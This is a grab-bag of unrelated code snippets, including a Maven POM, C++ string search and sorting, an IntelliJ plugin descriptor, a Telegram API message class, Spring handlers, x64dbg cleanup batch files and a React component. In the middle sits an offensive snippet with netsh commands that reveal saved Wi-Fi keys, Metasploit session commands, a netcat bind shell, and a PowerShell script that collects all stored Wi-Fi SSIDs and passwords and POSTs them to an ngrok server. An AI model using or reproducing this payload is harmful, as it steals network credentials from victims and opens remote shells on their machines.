	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<groupId>demo-test</groupId>
	<artifactId>demo-test</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	
	<properties>
		<downloadSources>true</downloadSources>
		<project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
                 <project.reporting.outputEncoding>UTF-8</project.reporting.outputEncoding>
                 <java.version>1.8</java.version>
		
		<version.spring.boot>2.1.3.RELEASE</version.spring.boot>
		<version.spring.cloud.starter>2.1.1.RELEASE</version.spring.cloud.starter>
		<version.junit>4.12</version.junit>
	</properties>

	<dependencies>
			<!-- ***** spring boot begin -->
			<dependency>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-starter</artifactId>
				<version>${version.spring.boot}</version>
			</dependency>
			<dependency>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-starter-web</artifactId>
				<version>${version.spring.boot}</version>
			</dependency>
			<dependency>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-starter-actuator</artifactId>
				<version>${version.spring.boot}</version>
			</dependency>
			<!-- ##### spring boot end -->
			
			<!-- ***** spring cloud begin -->
			<dependency>
				<groupId>org.springframework.cloud</groupId>
				<artifactId>spring-cloud-starter</artifactId>
				<version>${version.spring.cloud.starter}</version>
			</dependency>
			<!-- -->
			<dependency>
				<groupId>org.springframework.cloud</groupId>
				<artifactId>spring-cloud-starter-bus-amqp</artifactId>
				<version>${version.spring.cloud.starter}</version>
			</dependency> 
			
			<!-- ##### spring cloud end -->
			
			<dependency>
				<groupId>junit</groupId>
    			<artifactId>junit</artifactId>
				<scope>test</scope>
				<version>${version.junit}</version>
			</dependency>
		</dependencies>
	
</project>
--------------------------------------------------------------------------------------------------------
#include <iostream>
#include <vector>

using namespace std;

// Computes the prefix-suffix array.
vector<int> ComputePrefixFunction(string pattern){
    int m = pattern.length();
    vector<int> prefixArr(m);
    prefixArr[0] = 0;
    int k = 0;

    for(int i=1; i<m; ++i){
        while(k > 0 && pattern[k] != pattern[i]){
            k = prefixArr[k];
        }
        if(pattern[k] == pattern[i]){
            k++;
        }
        prefixArr[i] = k;
    }
    
    return prefixArr;
}

// Returns a vector of indicies where there is a pattern match.
vector<int> KMP(string text, string pattern){
    int n = text.length();
    int m = pattern.length();
    vector<int> prefixArr = ComputePrefixFunction(pattern);
    int q = 0;

    vector<int> results;

    for (int i = 0; i < n; ++i){
        while(q > 0 && pattern[q] != text[i]){
            q = prefixArr[q];
        }
        if(pattern[q] == text[i]){
            q++;
        }
        if(q == m){
            results.push_back(i-m);
            q = prefixArr[q];
        }
    }
    
    return results;
}

int main(){
    string example1 = "bacbababaabacabababaabaca";
    string pattern1 = "abaabaca";

    vector<int> result = KMP(example1, pattern1);
    vector<int>::iterator itt;
    cout << "Matches at the following indicies..." << endl;
    for(itt = result.begin(); itt != result.end(); ++itt){
        cout << *itt << endl;
    }
    return 0;
}
--------------------------------------------------------------------------------------------------------
// C++ implementation of Radix Sort 
#include<iostream> 
using namespace std; 
  
// A utility function to get maximum value in arr[] 
int getMax(int arr[], int n) 
{ 
    int mx = arr[0]; 
    for (int i = 1; i < n; i++) 
        if (arr[i] > mx) 
            mx = arr[i]; 
    return mx; 
} 
  
// A function to do counting sort of arr[] according to 
// the digit represented by exp. 
void countSort(int arr[], int n, int exp) 
{ 
    int output[n]; // output array 
    int i, count[10] = {0}; 
  
    // Store count of occurrences in count[] 
    for (i = 0; i < n; i++) 
        count[ (arr[i]/exp)%10 ]++; 
  
    // Change count[i] so that count[i] now contains actual 
    //  position of this digit in output[] 
    for (i = 1; i < 10; i++) 
        count[i] += count[i - 1]; 
  
    // Build the output array 
    for (i = n - 1; i >= 0; i--) 
    { 
        output[count[ (arr[i]/exp)%10 ] - 1] = arr[i]; 
        count[ (arr[i]/exp)%10 ]--; 
    } 
  
    // Copy the output array to arr[], so that arr[] now 
    // contains sorted numbers according to current digit 
    for (i = 0; i < n; i++) 
        arr[i] = output[i]; 
} 
  
// The main function to that sorts arr[] of size n using  
// Radix Sort 
void radixsort(int arr[], int n) 
{ 
    // Find the maximum number to know number of digits 
    int m = getMax(arr, n); 
  
    // Do counting sort for every digit. Note that instead 
    // of passing digit number, exp is passed. exp is 10^i 
    // where i is current digit number 
    for (int exp = 1; m/exp > 0; exp *= 10) 
        countSort(arr, n, exp); 
} 
  
// A utility function to print an array 
void print(int arr[], int n) 
{ 
    for (int i = 0; i < n; i++) 
        cout << arr[i] << " "; 
} 
  
// Driver program to test above functions 
int main() 
{ 
    int arr[] = {170, 45, 75, 90, 802, 24, 2, 66}; 
    int n = sizeof(arr)/sizeof(arr[0]); 
    radixsort(arr, n); 
    print(arr, n); 
    return 0; 
} 
-------------------------------------------------------------------------------------------------------
netsh wlan show profiles name="SSID HERE" key=clear
netsh wlan show profiles
msfconsole 
sessions
session -i 1

screen msfconsole -r /path/to/unicorn/unicorn.rc
nc -l -p6996 -e /bin/sh
nc 192.168.1.105 6996


powershell -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Web; $ngrokServer = \"http://SUBDOMAIN.ngrok.io/index.php\"; foreach ($path in [System.IO.Directory]::EnumerateFiles(\"C:\ProgramData\Microsoft\Wlansvc\Profiles\",\"*.xml\",\"AllDirectories\")) { try { $oXml = New-Object System.XML.XMLDocument; $oXml.Load($path); $ssid = $oXml.WLANProfile.SSIDConfig.SSID.Name; $netinfo = netsh.exe wlan show profiles name=\"$ssid\" key=clear; $pass = (($netinfo | Select-String -Pattern \"Key Content\") -split \":\")[1].Trim(); $sendData += \"SSID: \" + ($ssid) + \"`n\" + \"PASSWORD: \" + ($pass) + \"`n`n\"; } catch {}}; Invoke-WebRequest -Uri $ngrokServer -Method \"POST\" -Body $sendData;"

Invoke-WebRequest -Uri $ngrokServer -Method 'POST' -Body $sendData;


Add-Type -AssemblyName System.Web;

 

$ngrokServer = "http://SUBDOMAIN.ngrok.io/index.php";

https://img.wonderhowto.com/img/original/72/02/63645737427901/0/636457374279017202.jpg 

foreach ($path in [System.IO.Directory]::EnumerateFiles("C:\ProgramData\Microsoft\Wlansvc\Profiles","*.xml","AllDirectories")) {
try {

    $oXml = New-Object System.XML.XMLDocument;

    $oXml.Load($path);

    $ssid = $oXml.WLANProfile.SSIDConfig.SSID.Name;

    $netinfo = netsh.exe wlan show profiles name="$ssid" key=clear;

    $pass = (($netinfo | Select-String -Pattern "Key Content") -split ":")[1].Trim();
	$sendData += "SSID: " + ($ssid) + "`n" + "PASSWORD: " + ($pass) + "`n`n";
 } catch {}
}

https://null-byte.wonderhowto.com/how-to/android-for-hackers-turn-android-phone-into-hacking-device-without-root-0189649/#jump-step4
https://null-byte.wonderhowto.com/how-to/hack-wpa2-wi-fi-passwords-using-jedi-mind-tricks-usb-dead-drops-0185290/#jump-step9
https://null-byte.wonderhowto.com/how-to/hacks-mr-robot-use-shodan-api-with-python-automate-scans-for-vulnerable-devices-0180975/
-------------------------------------------------------------------------------------------------------
rm -rf *.class

javac TestCalcChain.java
java TestCalcChain
-------------------------------------------------------------------------------------------------------
<idea-plugin>
    <id>design.patterns.plugin</id>
    <name>Design Patterns</name>
    <vendor email="orestes.polyzos@gmail.com" url="https://www.linkedin.com/in/orestes-polyzos/">Orestes Polyzos</vendor>

    <idea-version since-build="172.*" until-build="192.*"/>

    <description>
        <![CDATA[
            <h2>Provides on the fly implementation of various design patterns based on user's code</h2>
            <p>More information can be found <a href="https://github.com/OrPolyzos/design-patterns-plugin">here</a>.</p>
            <h3>Currently supported design patterns</h3>
            <ul>
                <li>Behavioral</li>
                <ul>
                    <li>Strategy</li>
                </ul>
                <li>Creational</li>
                <ul>
                    <li>Builder (Inner)</li>
                    <li>Factory</li>
                    <li>Singleton</li>
                </ul>
            </ul>
        ]]>
    </description>

    <change-notes>
        <![CDATA[
            <ul>
                <li>
                    <strong>2.0.3</strong>
                    <ul>
                        <li>Adds support for IntelliJ IDEA until build '192.*'</li>
                    </ul>
                </li>
            </ul>
        ]]>
    </change-notes>

    <depends>com.intellij.modules.lang</depends>
    <depends>com.intellij.modules.java</depends>
    <depends>com.intellij.modules.ultimate</depends>
    <depends>com.intellij.modules.idea</depends>
    <depends>com.intellij.modules.idea.ultimate</depends>

    <actions>
        <group id="design-patterns-group" text="Design Patterns" popup="true">
            <add-to-group group-id="EditorPopupMenu" anchor="first"/>
        </group>
        <action id="builderDesignPattern" class="ore.plugins.idea.design.patterns.action.BuilderAction"
                text="Builder"
                description="Implements builder design pattern">
            <add-to-group group-id="design-patterns-group" anchor="first"/>
        </action>
        <action id="singletonDesignPattern" class="ore.plugins.idea.design.patterns.action.SingletonAction"
                text="Singleton"
                description="Implements singleton design pattern">
            <add-to-group group-id="design-patterns-group" anchor="after" relative-to-action="builderDesignPattern"/>
        </action>
        <action id="strategyDesignPattern" class="ore.plugins.idea.design.patterns.action.StrategyAction"
                text="Strategy"
                description="Implements strategy design pattern">
            <add-to-group group-id="design-patterns-group" anchor="after" relative-to-action="singletonDesignPattern"/>
        </action>
        <action id="factoryDesignPattern" class="ore.plugins.idea.design.patterns.action.FactoryAction" text="Factory"
                description="Implements factory design pattern">
            <add-to-group group-id="design-patterns-group" anchor="last"/>
        </action>
    </actions>
</idea-plugin>
-------------------------------------------------------------------------------------------------------

import com.fasterxml.jackson.annotation.JsonProperty;

import java.util.Arrays;

/**
 * This class represents a Telegram message.
 */
public class Message
{
	/**
	 * Unique message identifier.
	 */
	@JsonProperty("message_id")
	private int messageId;
	
	/**
	 * Optional. Sender, can be empty for messages sent to channels.
	 */
	@JsonProperty("from")
	private User from;
	
	/**
	 * Date the message was sent in Unix time.
	 */
	@JsonProperty("date")
	private int date;
	
	/**
	 * Conversation the message belongs to.
	 */
	@JsonProperty("chat")
	private Chat chat;
	
	/**
	 * Optional. For forwarded messages, sender of the original message.
	 */
	@JsonProperty("forward_from")
	private User forwardFrom;
	
	/**
	 * Optional. For messages forwarded from a channel, information about
	 * the original channel.
	 */
	@JsonProperty("forward_from_chat")
	private Chat forwardFromChat;
	
	/**
	 * Optional. For forwarded messages, date the original message was sent
	 * in Unix time.
	 */
	@JsonProperty("forward_date")
	private Integer forwardDate;
	
	/**
	 * Optional. For replies, the original message. Note that the Message
	 * object in this field will not contain further reply_to_message fields
	 * even if it itself is a reply.
	 */
	@JsonProperty("reply_to_message")
	private Message replyToMessage;
	
	/**
	 * Optional. Date the message was last edited in Unix time.
	 */
	@JsonProperty("edit_date")
	private int editDate;
	
	/**
	 * Optional. For text messages, the actual UTF-8 text of the message,
	 * 0-4096 characters.
	 */
	@JsonProperty("text")
	private String text;
	
	/**
	 * Optional. For text messages, special entities like usernames, URLs,
	 * bot commands, etc. that appear in the text.
	 */
	@JsonProperty("entities")
	private MessageEntity[] entities;
	
	/**
	 * Optional. Message is an audio file, information about the file.
	 */
	@JsonProperty("audio")
	private Audio audio;
	
	/**
	 * Optional. Message is a general file, information about the file.
	 */
	@JsonProperty("document")
	private Document document;
	
	/**
	 * Optional. Message is a photo, available sizes of the photo.
	 */
	@JsonProperty("photo")
	private PhotoSize[] photo;
	
	/**
	 * Optional. Message is a sticker, information about the sticker.
	 */
	@JsonProperty("sticker")
	private Sticker sticker;
	
	/**
	 * Optional. Message is a video, information about the video.
	 */
	@JsonProperty("video")
	private Video video;
	
	/**
	 * Optional. Message is a voice message, information about the file.
	 */
	@JsonProperty("voice")
	private Voice voice;
	
	/**
	 * Optional. Caption for the photo or video, 0-200 characters.
	 */
	@JsonProperty("caption")
	private String caption;
	
	/**
	 * Optional. Message is a shared contact, information about the contact.
	 */
	@JsonProperty("contact")
	private Contact contact;
	
	/**
	 * Optional. Message is a shared location, information about the location.
	 */
	@JsonProperty("location")
	private Location location;
	
	/**
	 * Optional. Message is a venue, information about the venue.
	 */
	@JsonProperty("venue")
	private Venue venue;
	
	/**
	 * Optional. A new member was added to the group, information about them
	 * (this member may be the bot itself).
	 */
	@JsonProperty("new_chat_member")
	private User newChatMember;
	
	/**
	 * Optional. A member was removed from the group, information about them
	 * (this member may be the bot itself).
	 */
	@JsonProperty("left_chat_member")
	private User leftChatMember;
	
	/**
	 * Optional. A chat title was changed to this value.
	 */
	@JsonProperty("new_chat_title")
	private String newChatTitle;
	
	/**
	 * Optional. A chat photo was change to this value.
	 */
	@JsonProperty("new_chat_photo")
	private PhotoSize[] newChatPhoto;
	
	/**
	 * Optional. Service message: the chat photo was deleted.
	 */
	@JsonProperty("delete_chat_photo")
	private Boolean deleteChatPhoto;
	
	/**
	 * Optional. Service message: the group has been created.
	 */
	@JsonProperty("group_chat_created")
	private Boolean groupChatCreated;
	
	/**
	 * Optional. Service message: the supergroup has been created.
	 * This field can‘t be received in a message coming through updates,
	 * because bot can’t be a member of a supergroup when it is created.
	 * It can only be found in reply_to_message if someone replies to
	 * a very first message in a directly created supergroup.
	 */
	@JsonProperty("supergroup_chat_created")
	private Boolean superGroupChatCreated;
	
	/**
	 * Optional. Service message: the channel has been created. This field
	 * can‘t be received in a message coming through updates, because bot
	 * can’t be a member of a channel when it is created. It can only be
	 * found in reply_to_message if someone replies to a very first message
	 * in a channel.
	 */
	@JsonProperty("channel_chat_created")
	private Boolean channelChatCreated;
	
	/**
	 * Optional. The group has been migrated to a supergroup with the specified
	 * identifier. This number may be greater than 32 bits and some programming
	 * languages may have difficulty/silent defects in interpreting it. But it
	 * smaller than 52 bits, so a signed 64 bit integer or double-precision float
	 * type are safe for storing this identifier.
	 */
	@JsonProperty("migrate_to_chat_id")
	private Long migrateToChatId;
	
	/**
	 * Optional. The supergroup has been migrated from a group with the specified
	 * identifier. This number may be greater than 32 bits and some programming
	 * languages may have difficulty/silent defects in interpreting it. But it
	 * smaller than 52 bits, so a signed 64 bit integer or double-precision float
	 * type are safe for storing this identifier.
	 */
	@JsonProperty("migrate_from_chat_id")
	private Long migrateFromChatId;
	
	/**
	 * Optional. Specified message was pinned. Note that the Message object
	 * in this field will not contain further reply_to_message fields even
	 * if it is itself a reply.
	 */
	@JsonProperty("pinned_message")
	private Message pinnedMessage;
	
	public Message(){}
	
	public Message(int messageId, User from, int date, Chat chat, User forwardFrom, Chat forwardFromChat,
	               Integer forwardDate, Message replyToMessage, int editDate, String text, MessageEntity[] entities,
	               Audio audio, Document document, PhotoSize[] photo, Sticker sticker, Video video, Voice voice,
	               String caption, Contact contact, Location location, Venue venue, User newChatMember,
	               User leftChatMember, String newChatTitle, PhotoSize[] newChatPhoto, Boolean deleteChatPhoto,
	               Boolean groupChatCreated, Boolean superGroupChatCreated, Boolean channelChatCreated,
	               Long migrateToChatId, Long migrateFromChatId, Message pinnedMessage)
	{
		this.messageId = messageId;
		this.from = from;
		this.date = date;
		this.chat = chat;
		this.forwardFrom = forwardFrom;
		this.forwardFromChat = forwardFromChat;
		this.forwardDate = forwardDate;
		this.replyToMessage = replyToMessage;
		this.editDate = editDate;
		this.text = text;
		this.entities = entities;
		this.audio = audio;
		this.document = document;
		this.photo = photo;
		this.sticker = sticker;
		this.video = video;
		this.voice = voice;
		this.caption = caption;
		this.contact = contact;
		this.location = location;
		this.venue = venue;
		this.newChatMember = newChatMember;
		this.leftChatMember = leftChatMember;
		this.newChatTitle = newChatTitle;
		this.newChatPhoto = newChatPhoto;
		this.deleteChatPhoto = deleteChatPhoto;
		this.groupChatCreated = groupChatCreated;
		this.superGroupChatCreated = superGroupChatCreated;
		this.channelChatCreated = channelChatCreated;
		this.migrateToChatId = migrateToChatId;
		this.migrateFromChatId = migrateFromChatId;
		this.pinnedMessage = pinnedMessage;
	}
	
	public int getMessageId(){return messageId;}
	public User getFrom(){return from;}
	public int getDate(){return date;}
	public Chat getChat(){return chat;}
	public User getForwardFrom(){return forwardFrom;}
	public Chat getForwardFromChat(){return forwardFromChat;}
	public Integer getForwardDate(){return forwardDate;}
	public Message getReplyToMessage(){return replyToMessage;}
	public int getEditDate(){return editDate;}
	public String getText(){return text;}
	public MessageEntity[] getEntities(){return entities;}
	public Audio getAudio(){return audio;}
	public Document getDocument(){return document;}
	public PhotoSize[] getPhoto(){return photo;}
	public Sticker getSticker(){return sticker;}
	public Video getVideo(){return video;}
	public Voice getVoice(){return voice;}
	public String getCaption(){return caption;}
	public Contact getContact(){return contact;}
	public Location getLocation(){return location;}
	public Venue getVenue(){return venue;}
	public User getNewChatMember(){return newChatMember;}
	public User getLeftChatMember(){return leftChatMember;}
	public String getNewChatTitle(){return newChatTitle;}
	public PhotoSize[] getNewChatPhoto(){return newChatPhoto;}
	public Boolean getDeleteChatPhoto(){return deleteChatPhoto;}
	public Boolean getGroupChatCreated(){return groupChatCreated;}
	public Boolean getSuperGroupChatCreated(){return superGroupChatCreated;}
	public Boolean getChannelChatCreated(){return channelChatCreated;}
	public Long getMigrateToChatId(){return migrateToChatId;}
	public Long getMigrateFromChatId(){return migrateFromChatId;}
	public Message getPinnedMessage(){return pinnedMessage;}
	
	@Override
	public boolean equals(Object o)
	{
		if(this == o) return true;
		if(!(o instanceof Message)) return false;
		
		Message message = (Message) o;
		
		if(messageId != message.messageId) return false;
		if(date != message.date) return false;
		if(editDate != message.editDate) return false;
		if(from != null ? !from.equals(message.from) : message.from != null) return false;
		if(chat != null ? !chat.equals(message.chat) : message.chat != null) return false;
		if(forwardFrom != null ? !forwardFrom.equals(message.forwardFrom) : message.forwardFrom != null) return false;
		if(forwardFromChat != null ? !forwardFromChat.equals(message.forwardFromChat) : message.forwardFromChat != null)
			return false;
		if(forwardDate != null ? !forwardDate.equals(message.forwardDate) : message.forwardDate != null) return false;
		if(replyToMessage != null ? !replyToMessage.equals(message.replyToMessage) : message.replyToMessage != null)
			return false;
		if(text != null ? !text.equals(message.text) : message.text != null) return false;
		if(!Arrays.deepEquals(entities, message.entities)) return false;
		if(audio != null ? !audio.equals(message.audio) : message.audio != null) return false;
		if(document != null ? !document.equals(message.document) : message.document != null) return false;
		if(!Arrays.deepEquals(photo, message.photo)) return false;
		if(sticker != null ? !sticker.equals(message.sticker) : message.sticker != null) return false;
		if(video != null ? !video.equals(message.video) : message.video != null) return false;
		if(voice != null ? !voice.equals(message.voice) : message.voice != null) return false;
		if(caption != null ? !caption.equals(message.caption) : message.caption != null) return false;
		if(contact != null ? !contact.equals(message.contact) : message.contact != null) return false;
		if(location != null ? !location.equals(message.location) : message.location != null) return false;
		if(venue != null ? !venue.equals(message.venue) : message.venue != null) return false;
		if(newChatMember != null ? !newChatMember.equals(message.newChatMember) : message.newChatMember != null)
			return false;
		if(leftChatMember != null ? !leftChatMember.equals(message.leftChatMember) : message.leftChatMember != null)
			return false;
		if(newChatTitle != null ? !newChatTitle.equals(message.newChatTitle) : message.newChatTitle != null)
			return false;
		if(!Arrays.deepEquals(newChatPhoto, message.newChatPhoto)) return false;
		if(deleteChatPhoto != null ? !deleteChatPhoto.equals(message.deleteChatPhoto) : message.deleteChatPhoto != null)
			return false;
		if(groupChatCreated != null ? !groupChatCreated.equals(message.groupChatCreated)
		                            : message.groupChatCreated != null) return false;
		if(superGroupChatCreated != null ? !superGroupChatCreated.equals(message.superGroupChatCreated)
		                                 : message.superGroupChatCreated != null) return false;
		if(channelChatCreated != null ? !channelChatCreated.equals(message.channelChatCreated)
		                              : message.channelChatCreated != null) return false;
		if(migrateToChatId != null ? !migrateToChatId.equals(message.migrateToChatId) : message.migrateToChatId != null)
			return false;
		if(migrateFromChatId != null ? !migrateFromChatId.equals(message.migrateFromChatId)
		                             : message.migrateFromChatId != null) return false;
		return pinnedMessage != null ? pinnedMessage.equals(message.pinnedMessage) : message.pinnedMessage == null;
		
	}
	
	@Override
	public int hashCode()
	{
		int result = messageId;
		result = 31 * result + (from != null ? from.hashCode() : 0);
		result = 31 * result + date;
		result = 31 * result + (chat != null ? chat.hashCode() : 0);
		result = 31 * result + (forwardFrom != null ? forwardFrom.hashCode() : 0);
		result = 31 * result + (forwardFromChat != null ? forwardFromChat.hashCode() : 0);
		result = 31 * result + (forwardDate != null ? forwardDate.hashCode() : 0);
		result = 31 * result + (replyToMessage != null ? replyToMessage.hashCode() : 0);
		result = 31 * result + editDate;
		result = 31 * result + (text != null ? text.hashCode() : 0);
		result = 31 * result + Arrays.deepHashCode(entities);
		result = 31 * result + (audio != null ? audio.hashCode() : 0);
		result = 31 * result + (document != null ? document.hashCode() : 0);
		result = 31 * result + Arrays.deepHashCode(photo);
		result = 31 * result + (sticker != null ? sticker.hashCode() : 0);
		result = 31 * result + (video != null ? video.hashCode() : 0);
		result = 31 * result + (voice != null ? voice.hashCode() : 0);
		result = 31 * result + (caption != null ? caption.hashCode() : 0);
		result = 31 * result + (contact != null ? contact.hashCode() : 0);
		result = 31 * result + (location != null ? location.hashCode() : 0);
		result = 31 * result + (venue != null ? venue.hashCode() : 0);
		result = 31 * result + (newChatMember != null ? newChatMember.hashCode() : 0);
		result = 31 * result + (leftChatMember != null ? leftChatMember.hashCode() : 0);
		result = 31 * result + (newChatTitle != null ? newChatTitle.hashCode() : 0);
		result = 31 * result + Arrays.deepHashCode(newChatPhoto);
		result = 31 * result + (deleteChatPhoto != null ? deleteChatPhoto.hashCode() : 0);
		result = 31 * result + (groupChatCreated != null ? groupChatCreated.hashCode() : 0);
		result = 31 * result + (superGroupChatCreated != null ? superGroupChatCreated.hashCode() : 0);
		result = 31 * result + (channelChatCreated != null ? channelChatCreated.hashCode() : 0);
		result = 31 * result + (migrateToChatId != null ? migrateToChatId.hashCode() : 0);
		result = 31 * result + (migrateFromChatId != null ? migrateFromChatId.hashCode() : 0);
		result = 31 * result + (pinnedMessage != null ? pinnedMessage.hashCode() : 0);
		return result;
	}
	
	@Override
	public String toString()
	{
		return "Message{" + "messageId=" + messageId + ", from=" + from + ", date=" + date + ", chat=" + chat +
				", forwardFrom=" + forwardFrom + ", forwardFromChat=" + forwardFromChat + ", forwardDate=" +
				forwardDate + ", replyToMessage=" + replyToMessage + ", editDate=" + editDate + ", text='" +
				text + '\'' + ", entities=" + Arrays.deepToString(entities) + ", audio=" + audio + ", document=" +
				document + ", photo=" + Arrays.deepToString(photo) + ", sticker=" + sticker + ", video=" + video +
				", voice=" + voice + ", caption='" + caption + '\'' + ", contact=" + contact + ", location=" +
				location + ", venue=" + venue + ", newChatMember=" + newChatMember + ", leftChatMember=" +
				leftChatMember + ", newChatTitle='" + newChatTitle + '\'' + ", newChatPhoto=" +
				Arrays.deepToString(newChatPhoto) + ", deleteChatPhoto=" + deleteChatPhoto + ", groupChatCreated=" +
				groupChatCreated + ", superGroupChatCreated=" + superGroupChatCreated + ", channelChatCreated=" +
				channelChatCreated + ", migrateToChatId=" + migrateToChatId + ", migrateFromChatId=" +
				migrateFromChatId + ", pinnedMessage=" + pinnedMessage + '}';
	}
}
-------------------------------------------------------------------------------------------------------
@ControllerAdvice
@RestController  
public class ServiceExceptionHandler extends ResponseEntityExceptionHandler
{

    @ExceptionHandler(Exception.class)  
    public final ResponseEntity<java.lang.Object> handleException(Throwable ex,WebRequest req)
    {
        ErrorResponse errorResponse = null;
        if (ex instanceof ApiException)
        {
            errorResponse = new ErrorResponse((ApiException) ex);
        }
        else
        {
            logger.error(ex);
            errorResponse = new ErrorResponse();
            errorResponse.setCode(HttpCodes.HTTP_CODE_500);
            errorResponse.setError(ex.getMessage());
        }
        return new ResponseEntity<Object>(errorResponse,
                HttpStatus.valueOf(errorResponse.getCode()));

    }
    protected ResponseEntity<Object> handleNoHandlerFoundException(NoHandlerFoundException ex,
            HttpHeaders headers, HttpStatus status, WebRequest request)
    {
        Map<String, String> responseBody = new HashMap<String, String>();
        responseBody.put("path", request.getContextPath());
        responseBody.put("message",
                "The URL you have reached is not in service at this time (404).");
        return new ResponseEntity<Object>(responseBody, HttpStatus.NOT_FOUND);
    }
}
-------------------------------------------------------------------------------------------------------
@echo off

echo Cleaning base directory...
del /Q *.sdf
del /Q *.layout
del /Q /A H *.suo
rmdir /S /Q ipch
rmdir /S /Q release
rmdir /S /Q build
rmdir /S /Q cov-int

echo Cleaning BRIDGE...
cd src\bridge
call :delfiles

echo Cleaning DBG...
cd src\dbg
call :delfiles

echo Cleaning EXE...
cd src\exe
call :delfiles

echo Cleaning LAUNCHER...
cd src\launcher
call :delfiles

echo Cleaning GUI SRC...
rmdir /S /Q src\gui_build

echo Cleaning GUI...
cd src/gui
rmdir /S /Q build
del /Q Makefile*
del /Q *.pdb
cd ..\..

echo Cleaning bin\
del /Q bin\*.pdb
del /Q bin\*.exp
del /Q bin\*.a
del /Q bin\*.lib
del /Q bin\*.def
del /Q bin\x96dbg.exe

echo Cleaning bin\x32...
rmdir /S /Q bin\x32\db
del /Q bin\x32\*.pdb
del /Q bin\x32\*.exp
del /Q bin\x32\*.a
del /Q bin\x32\*.lib
del /Q bin\x32\*.def
del /Q bin\x32\x32dbg.exe
del /Q bin\x32\x32dbg.dll
del /Q bin\x32\x32gui.dll
del /Q bin\x32\x32bridge.dll

echo Cleaning bin\x64...
rmdir /S /Q bin\x64\db
del /Q bin\x64\*.pdb
del /Q bin\x64\*.exp
del /Q bin\x64\*.a
del /Q bin\x64\*.lib
del /Q bin\x64\*.def
del /Q bin\x64\x64dbg.exe
del /Q bin\x64\x64dbg.dll
del /Q bin\x64\x64gui.dll
del /Q bin\x64\x64bridge.dll

echo Cleaning help...
cd help
del /Q *.chm
rmdir /S /Q output

echo Done!
exit 0

:delfiles
rmdir /S /Q obj
rmdir /S /Q Win32
rmdir /S /Q x64
del /Q *.bmarks
del /Q *.layout
del /Q *.depend
del /Q *.pdb
cd ..\..








@echo off

if "%OLDPATH%"=="" set OLDPATH=%PATH%

if "%QT32PATH%"=="" set QT32PATH=c:\Qt\qt-5.6.2-x86-msvc2013\5.6\msvc2013\bin
if "%QT64PATH%"=="" set QT64PATH=c:\Qt\qt-5.6.2-x64-msvc2013\5.6\msvc2013_64\bin
if "%QTCREATORPATH%"=="" set QTCREATORPATH=c:\Qt\qtcreator-4.3.1\bin
if "%VSVARSALLPATH%"=="" set VSVARSALLPATH=c:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\vcvarsall.bat
if "%COVERITYPATH%"=="" set COVERITYPATH=c:\coverity\bin

if "%1"=="x32" (
    goto x32
) else if "%1"=="x64" (
    goto x64
) else if "%1"=="coverity" (
    goto coverity
) else (
    echo "Usage: setenv x32/x64/coverity"
    goto :eof
)

:x32
echo Setting Qt in PATH
set PATH=%PATH%;%QT32PATH%
set PATH=%PATH%;%QTCREATORPATH%
echo Setting VS in PATH
call "%VSVARSALLPATH%"
goto :eof

:x64
echo Setting Qt in PATH
set PATH=%PATH%;%QT64PATH%
set PATH=%PATH%;%QTCREATORPATH%
echo Setting VS in PATH
call "%VSVARSALLPATH%" amd64
goto :eof

:coverity
echo Setting Coverity in PATH
set PATH=%PATH%;%COVERITYPATH%
goto :eof
-------------------------------------------------------------------------------------------------------
objdump -D -M intel file.bin | grep main.: -A20
-------------------------------------------------------------------------------------------------------
import React, { useState } from "react";

const HelloWorld = ()
=> {
  const [message, setMessage] = useState("Hello World!");

  return (
    <h2
      onClick={() => setMessage("The message has changed!")}
    >
      {message}
    </h2>
  );
};
-------------------------------------------------------------------------------------------------------
package com.paragon.microservices.links.model.domain;

import com.fasterxml.jackson.annotation.JsonIgnoreProperties;
import com.fasterxml.jackson.annotation.JsonInclude;
import com.fasterxml.jackson.annotation.JsonProperty;
import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;
import org.springframework.data.annotation.AccessType;
import org.springframework.data.annotation.Id;
import org.springframework.data.annotation.TypeAlias;
import org.springframework.data.mapping.PersistentProperty;
import org.springframework.data.mapping.PersistentPropertyAccessor;
import org.springframework.validation.annotation.Validated;

import javax.validation.constraints.NotBlank;
import javax.validation.constraints.NotEmpty;
import javax.validation.constraints.NotNull;
import java.io.Serializable;
import java.util.Map;

@Data
@Builder
@Validated
@AllArgsConstructor
@NoArgsConstructor
@TypeAlias("Ticket")
@JsonIgnoreProperties(ignoreUnknown = true)
@JsonInclude(JsonInclude.Include.NON_EMPTY)
public class Ticket implements PersistentPropertyAccessor<Ticket>, Serializable {
    /**
     * Serializable version identifier.
     */
    private static final long serialVersionUID = 6679898674452318620L;

    @Id
    @AccessType(AccessType.Type.PROPERTY)
    @JsonProperty(value = "id", required = true)
    //@JsonDeserialize(using = CustomDateSerializer.class)
    //@JsonSerialize(using = CustomDateSerializer2.class)
    @NotNull(message = "{domain.ticket.id.notNull}")
    private String id;

    @JsonProperty(value = "callBackTopicName", required = true)
    @NotBlank(message = "{domain.ticket.topic-name.notBlank}")
    private String topicName;

    @JsonProperty(value = "callBackMessageType", required = true)
    @NotBlank(message = "{domain.ticket.message-type.notBlank}")
    private String messageType;

    @JsonProperty(value = "details", required = true)
    @NotEmpty(message = "{domain.ticket.details.notEmpty}")
    private Map<String, Object> details;

    @Override
    public void setProperty(PersistentProperty<?> property, Object value) {
        final String str = null;
    }

    @Override
    public Object getProperty(PersistentProperty<?> property) {
        return null;
    }

    @Override
    public Ticket getBean() {
        return null;
    }
}

package com.paragon.microservices.links.system;

import com.fasterxml.jackson.core.JsonParser;
import com.fasterxml.jackson.databind.DeserializationContext;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.deser.std.StdDeserializer;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.util.UUID;

@Component
public class CustomDateSerializer extends StdDeserializer<UUID> {
    private final ObjectMapper objectMapper;

    @Autowired
    public CustomDateSerializer(final ObjectMapper objectMapper) {
        super(UUID.class);
        this.objectMapper = objectMapper;
    }

